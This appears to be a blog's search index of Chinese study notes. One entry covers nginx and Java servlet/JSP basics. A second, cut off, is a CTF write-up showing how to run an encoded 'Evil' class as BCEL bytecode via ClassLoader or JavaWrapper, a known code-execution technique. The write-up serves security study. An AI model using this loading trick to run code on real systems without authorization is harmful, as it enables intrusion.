<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>开发</title>
    <link href="/2023/09/16/%E5%BC%80%E5%8F%91/"/>
    <url>/2023/09/16/%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="老规矩上链接https-boogipop-com-图都是这里的，语言也很精简"><a href="#老规矩上链接https-boogipop-com-图都是这里的，语言也很精简" class="headerlink" title="老规矩上链接https://boogipop.com/图都是这里的，语言也很精简"></a>老规矩上链接<a href="https://boogipop.com/">https://boogipop.com/</a>图都是这里的，语言也很精简</h1><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>通过中间人牵线搭桥</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916171437179.png" alt="image-20230916171437179"></p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>给服务器配置代理服务器，客户端不知道服务端的真实ip</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916171626433.png" alt="image-20230916171626433"></p><p>客户端对代理无感知，客户端不需要任何配置就可以访问，只需要将请求发送到反向代理服务器去选择目标服务器的数据，然后返还给客户端</p><p>Boogipop的例子，反向代理服务器就是服务员，服务端就是厨师，你要什么服务员就给你拿什么</p><p>挺生动的</p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>基本的请求与响应</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916172125171.png" alt="image-20230916172125171"></p><p>并发数越来越高，用这样的系统可能会导致<strong>服务器瘫痪</strong></p><p>所以可以使用代理服务器分配到不同的服务端，实现负载均衡</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916172136692.png" alt="image-20230916172136692"></p><h2 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h2><p>仍然是代理服务器，根据发送的请求，分配到对应的服务器</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916172431286.png" alt="image-20230916172431286"></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><h2 id="配置tomcat"><a href="#配置tomcat" class="headerlink" title="配置tomcat"></a>配置tomcat</h2><p>tomcat +http</p><p>maven配置不说了（之前搞了很久才会，早知道早看大佬文章了）</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916201811624.png" alt="image-20230916201811624"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916201829256.png" alt="image-20230916201829256"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916201910077.png" alt="image-20230916201910077"></p><p>设置你访问的路径，假如你设置为<code>/kino</code>那访问的时候就加一个<code>URL/kino</code>这个过程叫做虚拟映射，也就是路由吧</p><h2 id="pom文件"><a href="#pom文件" class="headerlink" title="pom文件"></a>pom文件</h2><p>pom.xml是maven的核心配置文件，在这里添加依赖</p><p>maven由于约定大于配置，之后可能遇到我们写的配置文件，无法被导出或者生效的问题，解决方案是在pom.xml下的bulid节点添加以下内容：</p><div class="code-wrapper"><pre><code class="hljs xml"> <span class="hljs-comment">&lt;!--在build中配置resources，来防止我们资源导出失败的问题--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span></code></pre></div><p>servlet在pom.xml中设置路由</p><h2 id="Hello-servlet"><a href="#Hello-servlet" class="headerlink" title="Hello servlet"></a>Hello servlet</h2><blockquote><p>servlet就是sun公司开发动态页面所用的东西<br>sun公司在这些API中实现了一种接口叫做：Servlet，如果你想要开发一个Servlet程序，只需要完成2个小步骤</p><ul><li>编写一个类，实现Servlet接口</li><li>把开发好的java类部署到web服务器中</li></ul><p><strong>把实现了Servlet接口的java程序，叫做Servlet</strong></p></blockquote><p>先创建一个普通的maven，然后把src目录删掉</p><p>在pom.xml中加入</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>接着创建一个新<code>Module</code>，类型为webapp</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916215920852.png" alt="image-20230916215920852"></p><p>修改web.xml的内容为</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><span class="hljs-string"><span class="hljs-tag">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>&lt;/web-app &gt;</code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916220315151.png" alt="image-20230916220315151"></p><p>红色框这些都是需要自己创建的，<code>java</code>记得把他变蓝</p><p>然后可以创建程序，给了个默认接口HttpServlet</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916220630784.png" alt="image-20230916220630784"></p><p>我们选择重写GET和POST方法</p><div class="code-wrapper"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-type">PrintWriter</span> writer = resp.getWriter();        writer.print(<span class="hljs-string">&quot;hello servlet&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;    &#125;&#125;</code></pre></div><p>写完后要有关键一步，注册servlet</p><p>在web.xml中注册并设置路由</p><div class="code-wrapper"><pre><code class="hljs xml">//两个servlet-name名字相同即可<span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>   //路由<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><p>然后要配置tomcat，跟上面一样（记得war包）</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916221136554.png" alt="image-20230916221136554"></p><p>我们在web.xml中设置的路由是建立在Application context的路由基础上的</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916221255984.png" alt="image-20230916221255984"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916215650016.png" alt="image-20230916215650016"></p><h2 id="servlet原理"><a href="#servlet原理" class="headerlink" title="servlet原理"></a>servlet原理</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse resp)</span> <span class="hljs-comment">//req请求，resp响应</span></code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916223636244.png" alt="image-20230916223636244"></p><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>路由能使用<strong>通配符</strong>，但通配符的优先级更低，所以访问<code>/index</code>仍然是<code>HelloServlet</code>的内容</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>error<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.ErrorServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>error<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><h2 id="ServletContext对象"><a href="#ServletContext对象" class="headerlink" title="ServletContext对象"></a>ServletContext对象</h2><h3 id="共享数据"><a href="#共享数据" class="headerlink" title="共享数据"></a>共享数据</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//</span><span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();        servletContext.setAttribute(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;zeropeach&quot;</span>);        resp.getWriter().println(<span class="hljs-string">&quot;i am in 1231231&quot;</span>);   &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//    </span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> servletContext.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);        resp.getWriter().println(<span class="hljs-string">&quot;you are &quot;</span>+user);    &#125;</code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916225723367.png" alt="image-20230916225723367"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916225745267.png" alt="image-20230916225745267"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916225752556.png" alt="image-20230916225752556"></p><h3 id="能获取web-xml设置的初始值"><a href="#能获取web-xml设置的初始值" class="headerlink" title="能获取web.xml设置的初始值"></a>能获取web.xml设置的初始值</h3><div class="code-wrapper"><pre><code class="hljs sqf">&lt;context-<span class="hljs-built_in">param</span>&gt;    &lt;<span class="hljs-built_in">param</span>-<span class="hljs-built_in">name</span>&gt;cmd&lt;/<span class="hljs-built_in">param</span>-<span class="hljs-built_in">name</span>&gt;    &lt;<span class="hljs-built_in">param</span>-value&gt;heiheiehi&lt;/<span class="hljs-built_in">param</span>-value&gt;&lt;/context-<span class="hljs-built_in">param</span>&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs abnf">ServletContext servletContext <span class="hljs-operator">=</span> this.getServletContext()<span class="hljs-comment">;</span>String cmd <span class="hljs-operator">=</span> servletContext.getInitParameter(<span class="hljs-string">&quot;cmd&quot;</span>)<span class="hljs-comment">;</span>resp.getWriter().println(cmd)<span class="hljs-comment">;</span></code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916230454868.png" alt="image-20230916230454868"></p><h3 id="实现跳转"><a href="#实现跳转" class="headerlink" title="实现跳转"></a>实现跳转</h3><div class="code-wrapper"><pre><code class="hljs erb"><span class="language-xml">//index.jsp</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>跳转<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml">&lt;%</span><span class="language-ruby"><span class="hljs-variable">@page</span> pageEncoding=<span class="hljs-string">&quot;utf-8&quot;</span> </span><span class="language-xml">%&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/index&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span></span><span class="language-xml">    用户<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><span class="language-xml">    密码<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">@Overrideprotected void <span class="hljs-keyword">do</span><span class="hljs-constructor">Post(HttpServletRequest <span class="hljs-params">req</span>, HttpServletResponse <span class="hljs-params">resp</span>)</span> throws ServletException, IOException &#123;    String username = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;username&quot;</span>)</span>;    String password = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;password&quot;</span>)</span>;    <span class="hljs-keyword">if</span> (username.equals(<span class="hljs-string">&quot;admin&quot;</span>)&amp;&amp;password.equals(<span class="hljs-string">&quot;admin&quot;</span>))&#123;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;成功&quot;</span>);        resp.send<span class="hljs-constructor">Redirect(<span class="hljs-string">&quot;/s1/success.jsp&quot;</span>)</span>;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><p>这里<code>post</code>请求对应<code>doPost</code>方法</p><h2 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h2><p>&lt;%&#x3D; 变量或表达式%&gt;     &lt;%&#x3D;new java.util.Date()%&gt;</p><div class="code-wrapper"><pre><code class="hljs axapta">&lt;%<span class="hljs-built_in">int</span> <span class="hljs-keyword">sum</span>=<span class="hljs-number">0</span>;<span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">100</span>;i++)&#123;    <span class="hljs-keyword">sum</span>+=i;&#125;    out.println(<span class="hljs-string">&quot;&lt;h1&gt;sum=&quot;</span>+<span class="hljs-keyword">sum</span>+<span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);%&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs erlang-repl">&lt;<span class="hljs-comment">%</span>    int i =<span class="hljs-number">10</span>;<span class="hljs-comment">%&gt;</span>&lt;<span class="hljs-comment">%</span>    out.println(i);<span class="hljs-comment">%&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span>--在代码嵌入HTML--<span class="hljs-meta">%</span>&gt; &lt;<span class="hljs-meta">%</span>    for<span class="hljs-comment">(int i=0;i&lt;5;i++)</span>&#123; <span class="hljs-meta">%</span>&gt;    &lt;h<span class="hljs-number">1</span>&gt;hello world &lt;<span class="hljs-meta">%</span>=i<span class="hljs-meta">%</span>&gt;&lt;/h<span class="hljs-number">1</span>&gt; &lt;<span class="hljs-meta">%</span>    &#125; <span class="hljs-meta">%</span>&gt;</code></pre></div><p><code>&lt;%!%&gt;</code>声明方法和变量</p><p>&lt;% page errorPage&#x3D;”路径”%&gt;</p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attribute">language</span>=<span class="hljs-string">&quot;java&quot;</span> %&gt;</code></pre></div><h2 id="FILTER"><a href="#FILTER" class="headerlink" title="FILTER"></a>FILTER</h2><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><p>什么是MVC架构？MVC是Model、View、Controller</p><p>Model : 数据以及信息，相当于数据库</p><p>View : 前端页面</p><p>Controller : 根据用户从视图层输入的指令，选取数据层中的数据，然后进行对应的操作</p><h2 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h2><p>语法：${…}</p><p>调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应的对象，找不到返回””（空字符串）</p><blockquote><p>pageContext中最重要的方法：findAttribute方法，<br>使用pageContext.findAttribute方法能从<br>四个域(page, request, session, context)中寻找存储的数据，</p><p>查找的顺序也是从小到大(page—&gt;request—&gt;session—&gt;context)，</p><p>只要在某个域中能查到相对应的键值对，就返回，</p><p>如果四个域都没有则返回null。<br>这个方式对于EL表达式是最重要的，<br>例如JSP页面中有一个EL表达式： ${data}<br>最终在Servlet中就会被翻译成 pageContext.findAttribute(“data”)。</p></blockquote><p>查找的顺序从小到大(page—&gt;request—&gt;session—&gt;context)</p><div class="code-wrapper"><pre><code class="hljs pf">pageContext.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)request.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)session.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)application.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs mel">&lt;%=pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;&lt;%=pageContext.getRequest().getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;&lt;%=pageContext.getSession().getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;&lt;%=pageContext.getServletContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;</code></pre></div><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>&lt;%@ page isELIgnored&#x3D;”false”%&gt;</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWrapper执行BCEL字节码</title>
    <link href="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="通过JavaWrapper执行BCEL字节码"><a href="#通过JavaWrapper执行BCEL字节码" class="headerlink" title="通过JavaWrapper执行BCEL字节码"></a>通过JavaWrapper执行BCEL字节码</h1><p>前言</p><p>在SICTF Round2中看到unknown师傅使用了BCEL字节码，看了他的WP后发现一种我没见过的执行方式，在网上好像找不到（可能是我不会搜索），于是自己分析源码</p><p>unknown师傅的代码</p><div class="code-wrapper"><pre><code class="hljs powershell">//        //第一种触发方式//        JavaClass <span class="hljs-built_in">cls</span> = Repository.lookupClass(Evil.class);//        String code = Utility.encode(cls.getBytes(), true);//        System.out.println(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+code);////        new ClassLoader().loadClass(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span> + code).newInstance();//        第二种触发方式        JavaClass javaClass = Repository.lookupClass(Evil.class);        String encode = Utility.encode(javaClass.getBytes(), true);        JavaWrapper._main(new String[]&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+encode&#125;);        System.out.println(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+encode);</code></pre></div><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>我们常使用的BCEL是使用ClassLoader</p><div class="code-wrapper"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.util</span>.ClassLoader</code></pre></div><p>我们搜索一下这个包</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916120726884.png" alt="image-20230916120726884"></p><p>查看一下JavaWrapper类</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916121036227.png" alt="image-20230916121036227"></p><p>可以看到这两个跟ClassLoader执行方式有关的地方</p><p>继续往下看</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916121504223.png" 